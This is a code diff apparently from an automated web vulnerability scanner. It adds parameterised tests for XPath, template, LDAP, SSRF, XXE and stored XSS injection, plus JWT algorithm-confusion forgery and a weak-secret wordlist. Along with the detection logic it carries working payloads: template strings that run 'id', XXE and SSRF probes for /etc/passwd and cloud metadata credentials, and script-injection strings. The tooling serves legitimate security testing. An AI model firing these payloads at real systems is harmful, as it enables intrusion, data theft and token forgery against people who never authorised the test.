+            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
+            out, err, rc = await run(
+                ["curl", "-sS", "-L", "-k", "--max-time", "5"] + auth_args + [test_url],
+                timeout=10
+            )
+            if rc == 0 and out:
+                if "<!DOCTYPE" in out[:100] or "<html" in out[:100]:
+                    continue
+                for pattern in patterns:
+                    if re.search(pattern, out, re.IGNORECASE):
+                        results["vulnerable"] = True
+                        results["evidence"].append({
+                            "param": param,
+                            "payload": payload,
+                            "url": test_url,
+                            "response_snippet": out[:500],
+                        })
+                        break
+
+    results["payloads_tested"] = sorted(payloads_seen)
     return results
 
 
-async def xpath_injection_test(url: str) -> dict[str, Any]:
+async def xpath_injection_test(
+    url: str,
+    params_to_test: list[str] | None = None,
+    auth_session: Any | None = None,
+    param_defaults: dict[str, Any] | None = None,
+    max_params: int = 5,
+    max_payloads: int = 6,
+) -> dict[str, Any]:
     """
     Test for XPath injection vulnerabilities using error-based detection.
 
@@ -1745,41 +2240,72 @@ async def xpath_injection_test(url: str) -> dict[str, Any]:
         html_indicators = ["<!doctype", "<html", "<head>", "<body>", "<script", "<title>"]
         return sum(1 for ind in html_indicators if ind in content_lower) >= 2
 
-    for payload in payloads:
-        test_url = f"{url}&xpath={urllib.parse.quote(payload)}" if "?" in url else f"{url}?xpath={urllib.parse.quote(payload)}"
-        out, err, rc = await run(["curl", "-sS", "-L", "-k", "--max-time", "6", test_url], timeout=10)
-        results["payloads_tested"].append(payload)
-        if rc == 0 and out:
-            if _is_html_response(out):
-                continue
-            for pattern in error_patterns:
-                if re.search(pattern, out, re.IGNORECASE):
-                    results["vulnerable"] = True
-                    results["evidence"].append({
-                        "payload": payload,
-                        "error_pattern": pattern,
-                        "response_snippet": out[:500],
-                    })
-                    break
+    auth_args = get_auth_curl_args(auth_session)
+    parsed = urllib.parse.urlparse(url)
+    base_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+    if param_defaults:
+        for name, value in param_defaults.items():
+            if name not in base_params:
+                base_params[name] = [str(value)]
 
-        # Light POST test for form-encoded payloads
-        post_out, post_err, post_rc = await run(
-            ["curl", "-sS", "-X", "POST", "-L", "-k", "--max-time", "6", "-d", f"xpath={urllib.parse.quote(payload)}", url],
-            timeout=10
-        )
-        if post_rc == 0 and post_out:
-            if _is_html_response(post_out):
-                continue
-            for pattern in error_patterns:
-                if re.search(pattern, post_out, re.IGNORECASE):
-                    results["vulnerable"] = True
-                    results["evidence"].append({
-                        "payload": payload,
-                        "error_pattern": pattern,
-                        "response_snippet": post_out[:500],
-                        "method": "POST",
-                    })
-                    break
+    test_params = params_to_test or ["xpath"]
+    if params_to_test:
+        test_params = test_params[:max_params]
+    payloads_to_use = payloads if params_to_test is None else payloads[:max_payloads]
+    payloads_seen: set[str] = set()
+
+    for param in test_params:
+        if not param:
+            continue
+        results.setdefault("tested_params", []).append(param)
+        for payload in payloads_to_use:
+            payloads_seen.add(payload)
+            params = dict(base_params)
+            params[param] = [payload]
+            test_query = urllib.parse.urlencode(params, doseq=True)
+            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
+            out, err, rc = await run(
+                ["curl", "-sS", "-L", "-k", "--max-time", "6"] + auth_args + [test_url],
+                timeout=10
+            )
+            if rc == 0 and out:
+                if _is_html_response(out):
+                    continue
+                for pattern in error_patterns:
+                    if re.search(pattern, out, re.IGNORECASE):
+                        results["vulnerable"] = True
+                        results["evidence"].append({
+                            "param": param,
+                            "payload": payload,
+                            "error_pattern": pattern,
+                            "response_snippet": out[:500],
+                            "url": test_url,
+                        })
+                        break
+
+            # Light POST test for form-encoded payloads
+            post_out, post_err, post_rc = await run(
+                ["curl", "-sS", "-X", "POST", "-L", "-k", "--max-time", "6",
+                 "-d", f"{urllib.parse.quote(param)}={urllib.parse.quote(payload)}"] + auth_args + [url],
+                timeout=10
+            )
+            if post_rc == 0 and post_out:
+                if _is_html_response(post_out):
+                    continue
+                for pattern in error_patterns:
+                    if re.search(pattern, post_out, re.IGNORECASE):
+                        results["vulnerable"] = True
+                        results["evidence"].append({
+                            "param": param,
+                            "payload": payload,
+                            "error_pattern": pattern,
+                            "response_snippet": post_out[:500],
+                            "method": "POST",
+                            "url": url,
+                        })
+                        break
+
+    results["payloads_tested"] = sorted(payloads_seen)
 
     return results
 
@@ -1830,24 +2356,550 @@ async def xxe_injection_test(url: str) -> dict[str, Any]:
     return results
 
 
-async def ssti_test(url: str) -> dict[str, Any]:
-    results: dict[str, Any] = {"vulnerable": False, "payloads_tested": [], "evidence": []}
-    payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}", "{{config}}", "{{self.__dict__}}", "{{''.__class__.__mro__[1].__subclasses__()}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "#set($x=7*7)$x", "${T(java.lang.Runtime).getRuntime().exec('id')}"]
-    for payload in payloads:
-        test_url = f"{url}&template={urllib.parse.quote(payload)}" if "?" in url else f"{url}?template={urllib.parse.quote(payload)}"
-        out, err, rc = await run(["curl", "-sS", "-L", "-k", "--max-time", "5", test_url], timeout=10)
-        results["payloads_tested"].append(payload)
-        if rc == 0 and out:
-            if "7*7" in payload and "49" in out:
-                clean_out = re.sub(r'<!--.*?-->', '', out, flags=re.DOTALL)
-                clean_out = re.sub(r'<script.*?</script>', '', clean_out, flags=re.DOTALL)
-                if "49" in clean_out and not re.search(r'[/\w]49[/\w]', clean_out):
+async def ssti_test(
+    url: str,
+    params_to_test: list[str] | None = None,
+    auth_session: Any | None = None,
+    param_defaults: dict[str, Any] | None = None,
+    max_params: int = 5,
+    max_payloads: int = 6,
+) -> dict[str, Any]:
+    results: dict[str, Any] = {
+        "vulnerable": False,
+        "payloads_tested": [],
+        "tested_params": [],
+        "evidence": [],
+    }
+    payloads = [
+        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}",
+        "{{config}}", "{{self.__dict__}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
+        "{{_self.env.registerUndefinedFilterCallback('exec')}}",
+        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        "#set($x=7*7)$x", "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    ]
+
+    auth_args = get_auth_curl_args(auth_session)
+    parsed = urllib.parse.urlparse(url)
+    base_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+    if param_defaults:
+        for name, value in param_defaults.items():
+            if name not in base_params:
+                base_params[name] = [str(value)]
+
+    test_params = params_to_test or ["template"]
+    if params_to_test:
+        test_params = test_params[:max_params]
+    payloads_to_use = payloads if params_to_test is None else payloads[:max_payloads]
+    payloads_seen: set[str] = set()
+
+    for param in test_params:
+        if not param:
+            continue
+        results["tested_params"].append(param)
+        for payload in payloads_to_use:
+            payloads_seen.add(payload)
+            params = dict(base_params)
+            params[param] = [payload]
+            test_query = urllib.parse.urlencode(params, doseq=True)
+            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
+            out, err, rc = await run(
+                ["curl", "-sS", "-L", "-k", "--max-time", "5"] + auth_args + [test_url],
+                timeout=10
+            )
+            if rc == 0 and out:
+                if "7*7" in payload and "49" in out:
+                    clean_out = re.sub(r'<!--.*?-->', '', out, flags=re.DOTALL)
+                    clean_out = re.sub(r'<script.*?</script>', '', clean_out, flags=re.DOTALL)
+                    if "49" in clean_out and not re.search(r'[/\w]49[/\w]', clean_out):
+                        results["vulnerable"] = True
+                        results["evidence"].append({
+                            "type": "math-evaluation",
+                            "param": param,
+                            "payload": payload,
+                            "url": test_url,
+                            "response_snippet": out[:500],
+                        })
+                elif not ("<!DOCTYPE" in out[:100] or "<html" in out[:100]):
+                    if re.search(r"(jinja2\.exceptions\.|django\.template\.TemplateDoesNotExist|Twig[_\\]Error|TemplateProcessingException)", out, re.I):
+                        results["vulnerable"] = True
+                        results["evidence"].append({
+                            "type": "error-based",
+                            "param": param,
+                            "payload": payload,
+                            "url": test_url,
+                            "response_snippet": out[:500],
+                        })
+
+    results["payloads_tested"] = sorted(payloads_seen)
+    return results
+
+
+async def ldap_injection_test_json_body(
+    url: str,
+    method: str,
+    params: list[str],
+    auth_session: Any | None = None,
+    body_template: Any | None = None,
+    body_param_defaults: dict[str, Any] | None = None,
+    content_type: str = "application/json",
+    max_params: int = 4,
+    max_payloads: int = 5,
+) -> dict[str, Any]:
+    results: dict[str, Any] = {"vulnerable": False, "findings": [], "tested_params": [], "payloads_tested": []}
+    if not params:
+        return results
+    if content_type and "json" not in content_type.lower():
+        return results
+
+    payloads = [
+        "*", "*)(&", "*)(uid=*", "*)(|(uid=*", "*))%00", ")(cn=))(|(cn=*",
+        "*()|&'", "admin*", "admin*)((|userPassword=*)", "x' or name()='username' or 'x'='y"
+    ]
+    error_patterns = [
+        r"javax\.naming\.(ldap\.)?LDAPException", r"com\.sun\.jndi\.ldap",
+        r"ldap_bind:.*failed", r"ldap_search:.*failed", r"LDAP.*error.*0x\d+",
+        r"Invalid DN syntax", r"malformed filter", r"LDAP injection detected"
+    ]
+
+    def _is_html_response(content: str) -> bool:
+        if not content:
+            return False
+        content_lower = content[:2000].lower()
+        html_indicators = ["<!doctype", "<html", "<head>", "<body>", "<script", "<title>"]
+        return sum(1 for ind in html_indicators if ind in content_lower) >= 2
+
+    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
+    base_body = _build_body_template({"body_template": body_template}) if body_template is not None else {}
+    if isinstance(base_body, dict) and body_param_defaults:
+        for k, v in body_param_defaults.items():
+            base_body.setdefault(k, v)
+    if isinstance(base_body, list) and body_param_defaults and base_body and isinstance(base_body[0], dict):
+        for k, v in body_param_defaults.items():
+            base_body[0].setdefault(k, v)
+
+    payloads_seen: set[str] = set()
+    for param in params[:max_params]:
+        if not param:
+            continue
+        results["tested_params"].append(param)
+        for payload in payloads[:max_payloads]:
+            payloads_seen.add(payload)
+            test_body = _apply_body_param(base_body, param, payload)
+            body_args, header_args = _build_curl_body_args(test_body, content_type)
+            out, err, rc = await run(
+                ["curl", "-sS", "-L", "-k", "--max-time", "8", "-X", method] + auth_args + header_args + body_args + [url],
+                timeout=12
+            )
+            if rc == 0 and out:
+                if _is_html_response(out):
+                    continue
+                for pattern in error_patterns:
+                    if re.search(pattern, out, re.IGNORECASE):
+                        results["vulnerable"] = True
+                        results["findings"].append({
+                            "param": param,
+                            "payload": payload,
+                            "url": url,
+                            "method": method,
+                            "response_snippet": out[:500],
+                        })
+                        break
+
+    results["payloads_tested"] = sorted(payloads_seen)
+    return results
+
+
+async def xpath_injection_test_json_body(
+    url: str,
+    method: str,
+    params: list[str],
+    auth_session: Any | None = None,
+    body_template: Any | None = None,
+    body_param_defaults: dict[str, Any] | None = None,
+    content_type: str = "application/json",
+    max_params: int = 4,
+    max_payloads: int = 5,
+) -> dict[str, Any]:
+    results: dict[str, Any] = {"vulnerable": False, "findings": [], "tested_params": [], "payloads_tested": []}
+    if not params:
+        return results
+    if content_type and "json" not in content_type.lower():
+        return results
+
+    payloads = [
+        "' or '1'='1",
+        "\" or \"1\"=\"1",
+        "' or 1=1 or ''='",
+        "')] | //* | 'a'='a",
+        "' or contains(name(),'a') or 'a'='b",
+        "' or string-length(name())=1 or 'a'='b",
+        "' or count(//*)=1 or 'a'='a",
+        "\" or count(//*)=1 or \"a\"=\"a",
+    ]
+    error_patterns = [
+        r"XPathException",
+        r"XPath\s+expression",
+        r"XPathSyntaxError",
+        r"XQuery\s+error",
+        r"XSLT\s+error",
+        r"Invalid\s+predicate",
+        r"Unclosed\s+string",
+        r"xmlXPathEval",
+        r"javax\.xml\.xpath\.XPathExpressionException",
+        r"org\.jaxen\.JaxenException",
+        r"Undefined\s+function",
+    ]
+
+    def _is_html_response(content: str) -> bool:
+        if not content:
+            return False
+        content_lower = content[:2000].lower()
+        html_indicators = ["<!doctype", "<html", "<head>", "<body>", "<script", "<title>"]
+        return sum(1 for ind in html_indicators if ind in content_lower) >= 2
+
+    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
+    base_body = _build_body_template({"body_template": body_template}) if body_template is not None else {}
+    if isinstance(base_body, dict) and body_param_defaults:
+        for k, v in body_param_defaults.items():
+            base_body.setdefault(k, v)
+    if isinstance(base_body, list) and body_param_defaults and base_body and isinstance(base_body[0], dict):
+        for k, v in body_param_defaults.items():
+            base_body[0].setdefault(k, v)
+
+    payloads_seen: set[str] = set()
+    for param in params[:max_params]:
+        if not param:
+            continue
+        results["tested_params"].append(param)
+        for payload in payloads[:max_payloads]:
+            payloads_seen.add(payload)
+            test_body = _apply_body_param(base_body, param, payload)
+            body_args, header_args = _build_curl_body_args(test_body, content_type)
+            out, err, rc = await run(
+                ["curl", "-sS", "-L", "-k", "--max-time", "8", "-X", method] + auth_args + header_args + body_args + [url],
+                timeout=12
+            )
+            if rc == 0 and out:
+                if _is_html_response(out):
+                    continue
+                for pattern in error_patterns:
+                    if re.search(pattern, out, re.IGNORECASE):
+                        results["vulnerable"] = True
+                        results["findings"].append({
+                            "param": param,
+                            "payload": payload,
+                            "url": url,
+                            "method": method,
+                            "response_snippet": out[:500],
+                        })
+                        break
+
+    results["payloads_tested"] = sorted(payloads_seen)
+    return results
+
+
+async def ssrf_injection_test_json_body(
+    url: str,
+    method: str,
+    params: list[str],
+    auth_session: Any | None = None,
+    body_template: Any | None = None,
+    body_param_defaults: dict[str, Any] | None = None,
+    content_type: str = "application/json",
+    max_params: int = 3,
+    max_payloads: int = 3,
+) -> dict[str, Any]:
+    results: dict[str, Any] = {"vulnerable": False, "findings": [], "tested_params": [], "payloads_tested": []}
+    if not params:
+        return results
+    if content_type and "json" not in content_type.lower():
+        return results
+
+    payloads = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://localhost:22",
+        "file:///etc/passwd",
+    ]
+    file_indicators = ["root:", "/bin/bash", "daemon:", "nobody:", "root:x:0:0"]
+    ssrf_indicators = ["169.254.169.254", "ami-id", "instance-id", "iam/security-credentials"]
+
+    def _is_html_response(content: str) -> bool:
+        if not content:
+            return False
+        content_lower = content[:2000].lower()
+        html_indicators = ["<!doctype", "<html", "<head>", "<body>", "<script", "<title>"]
+        return sum(1 for ind in html_indicators if ind in content_lower) >= 2
+
+    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
+    base_body = _build_body_template({"body_template": body_template}) if body_template is not None else {}
+    if isinstance(base_body, dict) and body_param_defaults:
+        for k, v in body_param_defaults.items():
+            base_body.setdefault(k, v)
+    if isinstance(base_body, list) and body_param_defaults and base_body and isinstance(base_body[0], dict):
+        for k, v in body_param_defaults.items():
+            base_body[0].setdefault(k, v)
+
+    payloads_seen: set[str] = set()
+    for param in params[:max_params]:
+        if not param:
+            continue
+        results["tested_params"].append(param)
+        for payload in payloads[:max_payloads]:
+            payloads_seen.add(payload)
+            test_body = _apply_body_param(base_body, param, payload)
+            body_args, header_args = _build_curl_body_args(test_body, content_type)
+            out, err, rc = await run(
+                ["curl", "-sS", "-L", "-k", "--max-time", "8", "-X", method] + auth_args + header_args + body_args + [url],
+                timeout=12
+            )
+            if rc == 0 and out:
+                if _is_html_response(out):
+                    continue
+                if any(ind in out for ind in file_indicators) or any(ind in out for ind in ssrf_indicators):
                     results["vulnerable"] = True
-                    results["evidence"].append({"type": "math-evaluation", "payload": payload, "response_snippet": out[:500]})
-            elif not ("<!DOCTYPE" in out[:100] or "<html" in out[:100]):
-                if re.search(r"(jinja2\.exceptions\.|django\.template\.TemplateDoesNotExist|Twig[_\\]Error|TemplateProcessingException)", out, re.I):
+                    results["findings"].append({
+                        "param": param,
+                        "payload": payload,
+                        "url": url,
+                        "method": method,
+                        "response_snippet": out[:500],
+                    })
+                    break
+
+    results["payloads_tested"] = sorted(payloads_seen)
+    return results
+
+
+async def xxe_injection_test_json_body(
+    url: str,
+    method: str,
+    params: list[str],
+    auth_session: Any | None = None,
+    body_template: Any | None = None,
+    body_param_defaults: dict[str, Any] | None = None,
+    content_type: str = "application/json",
+    max_params: int = 3,
+    max_payloads: int = 2,
+) -> dict[str, Any]:
+    results: dict[str, Any] = {"vulnerable": False, "findings": [], "tested_params": [], "payloads_tested": []}
+    if not params:
+        return results
+    if content_type and "json" not in content_type.lower():
+        return results
+
+    payloads = [
+        """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>""",
+        """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>""",
+    ]
+    file_indicators = ["root:", "/bin/bash", "daemon:", "nobody:", "root:x:0:0"]
+    ssrf_indicators = ["169.254.169.254", "ami-id", "instance-id", "iam/security-credentials"]
+    error_patterns = [
+        r"External entity.*not allowed",
+        r"Detected an entity reference loop",
+        r"parser error.*Entity",
+        r"DOCTYPE.*forbidden",
+        r"XML.*error.*entity",
+    ]
+
+    def _is_html_response(content: str) -> bool:
+        if not content:
+            return False
+        content_lower = content[:2000].lower()
+        html_indicators = ["<!doctype", "<html", "<head>", "<body>", "<script", "<title>"]
+        return sum(1 for ind in html_indicators if ind in content_lower) >= 2
+
+    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
+    base_body = _build_body_template({"body_template": body_template}) if body_template is not None else {}
+    if isinstance(base_body, dict) and body_param_defaults:
+        for k, v in body_param_defaults.items():
+            base_body.setdefault(k, v)
+    if isinstance(base_body, list) and body_param_defaults and base_body and isinstance(base_body[0], dict):
+        for k, v in body_param_defaults.items():
+            base_body[0].setdefault(k, v)
+
+    payloads_seen: set[str] = set()
+    for param in params[:max_params]:
+        if not param:
+            continue
+        results["tested_params"].append(param)
+        for payload in payloads[:max_payloads]:
+            payloads_seen.add(payload)
+            test_body = _apply_body_param(base_body, param, payload)
+            body_args, header_args = _build_curl_body_args(test_body, content_type)
+            out, err, rc = await run(
+                ["curl", "-sS", "-L", "-k", "--max-time", "8", "-X", method] + auth_args + header_args + body_args + [url],
+                timeout=12
+            )
+            if rc == 0 and out:
+                if _is_html_response(out):
+                    continue
+                has_file = any(ind in out for ind in file_indicators)
+                has_ssrf = any(ind in out for ind in ssrf_indicators)
+                has_error = any(re.search(pat, out, re.IGNORECASE) for pat in error_patterns)
+                if (has_file or has_ssrf or has_error):
                     results["vulnerable"] = True
-                    results["evidence"].append({"type": "error-based", "payload": payload, "response_snippet": out[:500]})
+                    results["findings"].append({
+                        "param": param,
+                        "payload": payload[:120],
+                        "url": url,
+                        "method": method,
+                        "response_snippet": out[:500],
+                    })
+                    break
+
+    results["payloads_tested"] = sorted(payloads_seen)
+    return results
+
+
+async def stored_xss_workflow(
+    base_url: str,
+    endpoints: list[dict[str, Any]],
+    discovered_urls: list[str] | None = None,
+    auth_session: Any | None = None,
+    max_forms: int = 5,
+    max_pages: int = 15,
+) -> dict[str, Any]:
+    """
+    Attempt to detect stored XSS by submitting payloads via discovered POST endpoints
+    and then checking other pages for unescaped payload reuse.
+    """
+    results: dict[str, Any] = {
+        "vulnerable": False,
+        "forms_tested": 0,
+        "payloads_sent": 0,
+        "findings": [],
+        "evidence": [],
+    }
+    if not endpoints:
+        return results
+
+    marker = f"shakerxss{random.randint(10000, 99999)}"
+    payloads = [
+        f"<img src=x onerror=alert(1)>{marker}",
+        f"\\\"><svg onload=alert(1)>{marker}",
+    ]
+
+    param_hints = {
+        "comment", "message", "review", "feedback", "content", "body", "text",
+        "description", "note", "title", "name", "post", "reply"
+    }
+
+    def _is_static(url: str) -> bool:
+        ext = os.path.splitext(urllib.parse.urlparse(url).path.lower())[1]
+        return ext in {".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".css", ".map", ".js", ".woff", ".woff2", ".ttf", ".eot"}
+
+    def _in_scope(url: str) -> bool:
+        if not url or not base_url:
+            return False
+        try:
+            return urllib.parse.urlparse(url).netloc == urllib.parse.urlparse(base_url).netloc
+        except Exception:
+            return False
+
+    urls_to_check = []
+    if discovered_urls:
+        urls_to_check = [u for u in discovered_urls if u and _in_scope(u) and not _is_static(u)]
+    if base_url and base_url not in urls_to_check:
+        urls_to_check.append(base_url)
+
+    # Prioritize likely render pages
+    keywords = ("comment", "review", "feedback", "message", "post", "blog", "profile", "user", "admin", "note")
+    priority = [u for u in urls_to_check if any(k in u.lower() for k in keywords)]
+    remaining = [u for u in urls_to_check if u not in priority]
+    pages_to_check = (priority + remaining)[:max_pages]
+
+    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
+
+    def _coerce_param_list(raw: Any) -> list[str]:
+        if isinstance(raw, dict):
+            return [str(k) for k in raw.keys() if k]
+        if isinstance(raw, (list, tuple, set)):
+            return [str(v) for v in raw if v]
+        if isinstance(raw, str):
+            return [raw] if raw else []
+        return []
+
+    # Candidate POST endpoints
+    form_candidates = [
+        ep for ep in endpoints
+        if (ep.get("method") or "GET").upper() in ("POST", "PUT", "PATCH")
+        and ep.get("body_params")
+        and "multipart/form-data" not in (ep.get("content_type") or "").lower()
+    ]
+    if not form_candidates:
+        return results
+
+    for endpoint in form_candidates[:max_forms]:
+        method = (endpoint.get("method") or "POST").upper()
+        url = endpoint.get("url")
+        if not url:
+            continue
+        body_params = _coerce_param_list(endpoint.get("body_params") or endpoint.get("params"))
+        if not body_params:
+            continue
+        content_type = endpoint.get("content_type") or "application/json"
+        base_body = _build_body_template(endpoint)
+        defaults = endpoint.get("body_param_defaults") or {}
+        if isinstance(base_body, dict) and defaults:
+            for k, v in defaults.items():
+                base_body.setdefault(k, v)
+        if isinstance(base_body, list) and defaults and base_body and isinstance(base_body[0], dict):
+            for k, v in defaults.items():
+                base_body[0].setdefault(k, v)
+
+        # Prefer text-like fields
+        hint_params = [p for p in body_params if p.lower() in param_hints]
+        target_params = hint_params if hint_params else body_params[:2]
+
+        for param in target_params:
+            for payload in payloads:
+                test_body = _apply_body_param(base_body, param, payload)
+                body_args, header_args = _build_curl_body_args(test_body, content_type)
+                out, err, rc = await run(
+                    ["curl", "-sS", "-L", "-k", "--max-time", "10", "-X", method] + auth_args + header_args + body_args + [url],
+                    timeout=15
+                )
+                results["payloads_sent"] += 1
+                results["forms_tested"] += 1
+
+                # After submit, check pages for stored payload
+                for page_url in pages_to_check:
+                    try:
+                        page_out, _, page_rc = await run(
+                            ["curl", "-sS", "-L", "-k", "--max-time", "10"] + auth_args + [page_url],
+                            timeout=12
+                        )
+                    except Exception:
+                        continue
+                    if page_rc != 0 or not page_out:
+                        continue
+                    if marker not in page_out:
+                        continue
+                    # Favor exact payload reflection
+                    payload_reflected = payload in page_out
+                    idx = page_out.find(marker)
+                    snippet = page_out[max(0, idx - 80): idx + 120] if idx >= 0 else page_out[:200]
+                    results["vulnerable"] = True
+                    results["findings"].append({
+                        "injection_url": url,
+                        "stored_url": page_url,
+                        "param": param,
+                        "payload": payload,
+                        "payload_reflected": payload_reflected,
+                        "snippet": snippet,
+                        "method": method,
+                        "severity": "high" if payload_reflected else "medium",
+                    })
+                    results["evidence"].append({
+                        "stored_url": page_url,
+                        "snippet": snippet,
+                    })
+                    break
+            if results["vulnerable"]:
+                break
+        if results["vulnerable"]:
+            break
+
     return results
 
 
@@ -1900,6 +2952,483 @@ async def jwt_vulnerability_test(url: str, sample_token: str | None = None) -> d
                     pass
         except Exception:
             pass
+    return results
+
+
+# =============================================================================
+# ENHANCED JWT SECURITY TESTING
+# =============================================================================
+
+# Extended weak secrets list - loaded from wordlist or use defaults
+JWT_WEAK_SECRETS_DEFAULT = [
+    # Original 6
+    'secret', 'password', '123456', 'key', 'jwt', 'token',
+    # Common secrets
+    'admin', 'test', 'hello', 'changeme', 'default', 'private',
+    'public', 'mysecret', 'secretkey', 'privatekey', 'jwtkey',
+    # Framework defaults
+    'supersecret', 'supersecretkey', 'your-256-bit-secret',
+    'your-secret-key', 'your_secret_key', 'auth_secret',
+    # Development defaults
+    'development', 'production', 'staging', 'local',
+    'dev_secret', 'prod_secret', 'testing', 'debug',
+    # Common patterns
+    'qwerty', 'letmein', 'welcome', 'monkey', 'dragon',
+    '12345678', '123456789', '1234567890', 'abcd1234',
+    # Base64 encoded common secrets
+    'c2VjcmV0', 'cGFzc3dvcmQ=', 'YWRtaW4=',  # secret, password, admin
+    # Empty/null
+    '', ' ', 'null', 'none', 'undefined',
+    # JWT library examples
+    'secret123', 'jwtsecret', 'secretjwt', 'jwt_secret',
+    'jwt-secret', 'my_jwt_secret', 'my-jwt-secret',
+    # HMAC common
+    'hmac_secret', 'hmac-secret', 'hmacsecret', 'signing_key',
+    'signing-key', 'signingkey', 'sign_key', 'signkey',
+]
+
+
+def _load_jwt_secrets_wordlist() -> list[str]:
+    """Load JWT weak secrets from wordlist file if available."""
+    wordlist_paths = [
+        os.path.join(os.path.dirname(__file__), '..', 'payloads', 'jwt', 'weak-secrets.txt'),
+        '/app/payloads/jwt/weak-secrets.txt',
+    ]
+
+    for path in wordlist_paths:
+        if os.path.exists(path):
+            try:
+                with open(path, 'r') as f:
+                    secrets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+                    return secrets if secrets else JWT_WEAK_SECRETS_DEFAULT
+            except Exception:
+                pass
+
+    return JWT_WEAK_SECRETS_DEFAULT
+
+
+def _decode_jwt_parts(token: str) -> tuple[dict | None, dict | None, str | None]:
+    """Decode JWT header and payload without verification."""
+    try:
+        parts = token.split('.')
+        if len(parts) != 3:
+            return None, None, None
+
+        # Decode header
+        header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
+        header = json.loads(base64.urlsafe_b64decode(header_b64))
+
+        # Decode payload
+        payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
+        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
+
+        return header, payload, parts[2]
+    except Exception:
+        return None, None, None
+
+
+def _encode_jwt_parts(header: dict, payload: dict, signature: str = "") -> str:
+    """Encode JWT parts into a token string."""
+    header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).rstrip(b'=').decode()
+    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).rstrip(b'=').decode()
+    return f"{header_b64}.{payload_b64}.{signature}"
+
+
+async def jwt_algorithm_confusion_test(
+    url: str,
+    sample_token: str,
+    jwks_url: str | None = None,
+    auth_session: Any = None,
+) -> dict[str, Any]:
+    """
+    Test RS256 to HS256 algorithm confusion vulnerability.
+
+    When a server uses RS256 (asymmetric), an attacker may try to:
+    1. Change the algorithm to HS256 (symmetric)
+    2. Sign the token using the public key as the HMAC secret
+    3. If server doesn't validate algorithm properly, it may accept the forged token
+    """
+    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}
+
+    header, payload, _ = _decode_jwt_parts(sample_token)
+    if not header or not payload:
+        return results
+
+    original_alg = header.get('alg', '').upper()
+
+    # Only test if original algorithm is RS256/RS384/RS512/ES256/etc
+    if not original_alg.startswith('RS') and not original_alg.startswith('ES') and not original_alg.startswith('PS'):
+        return results
+
+    # Try to discover JWKS URL
+    if not jwks_url:
+        for endpoint in ['/.well-known/jwks.json', '/jwks.json', '/.well-known/openid-configuration']:
+            test_url = urllib.parse.urljoin(url, endpoint)
+            out, err, rc = await run(["curl", "-sS", "-L", "-k", test_url], timeout=10)
+            if rc == 0 and out:
+                if endpoint.endswith('openid-configuration'):
+                    try:
+                        config = json.loads(out)
+                        jwks_url = config.get('jwks_uri')
+                        break
+                    except Exception:
+                        continue
+                elif 'keys' in out:
+                    jwks_url = test_url
+                    break
+
+    if not jwks_url:
+        return results
+
+    # Fetch JWKS and extract public key
+    out, err, rc = await run(["curl", "-sS", "-L", "-k", jwks_url], timeout=10)
+    if rc != 0 or not out:
+        return results
+
+    try:
+        jwks = json.loads(out)
+        keys = jwks.get('keys', [])
+
+        for key in keys:
+            if key.get('kty') != 'RSA':
+                continue
+
+            try:
+                import jwt as pyjwt
+                from jwt.algorithms import RSAAlgorithm
+                from cryptography.hazmat.primitives import serialization
+
+                # Convert JWK to PEM
+                public_key_obj = RSAAlgorithm.from_jwk(json.dumps(key))
+                public_key_str = public_key_obj.public_bytes(
+                    encoding=serialization.Encoding.PEM,
+                    format=serialization.PublicFormat.SubjectPublicKeyInfo
+                ).decode()
+
+                # Create HS256 token signed with public key as secret
+                forged_token = pyjwt.encode(payload, public_key_str, algorithm='HS256')
+
+                # Test the forged token
+                auth_args = get_auth_curl_args(auth_session)  # Handles None internally
+                test_out, test_err, test_rc = await run(
+                    ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
+                    timeout=10
+                )
+
+                if test_rc == 0 and test_out:
+                    if "401" not in test_out[:200] and "403" not in test_out[:200] and "unauthorized" not in test_out.lower()[:500]:
+                        results["vulnerable"] = True
+                        results["issues"].append("algorithm_confusion")
+                        results["evidence"].append({
+                            "type": "algorithm_confusion",
+                            "original_alg": original_alg,
+                            "attack_alg": "HS256",
+                            "description": f"Server accepted RS256->HS256 algorithm confusion attack",
+                            "jwks_url": jwks_url,
+                        })
+                        break
+            except Exception:
+                continue
+
+    except Exception:
+        pass
+
+    return results
+
+
+async def jwt_kid_injection_test(
+    url: str,
+    sample_token: str,
+    auth_session: Any = None,
+) -> dict[str, Any]:
+    """
+    Test JWT kid (Key ID) header injection vulnerabilities.
+
+    The 'kid' header parameter can be vulnerable to:
+    1. Path traversal - read arbitrary files as key
+    2. SQL injection - if kid is used in database query
+    3. Command injection - if kid is passed to shell
+    """
+    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}
+
+    header, payload, _ = _decode_jwt_parts(sample_token)
+    if not header or not payload:
+        return results
+
+    # kid injection payloads
